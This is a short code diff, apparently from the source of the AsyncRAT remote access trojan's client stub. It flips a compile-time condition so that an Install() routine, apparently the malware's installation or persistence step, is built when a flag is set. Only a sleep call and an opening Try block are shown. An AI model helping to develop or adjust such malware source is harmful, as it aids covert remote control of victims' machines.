@@ -104,7 +104,7 @@ Namespace AsyncRAT_Stub
 
         End Sub
 
-#If Not INS Then
+#If INS Then
         Public Shared Sub Install()
             Thread.Sleep(2 * 1000)
             Try
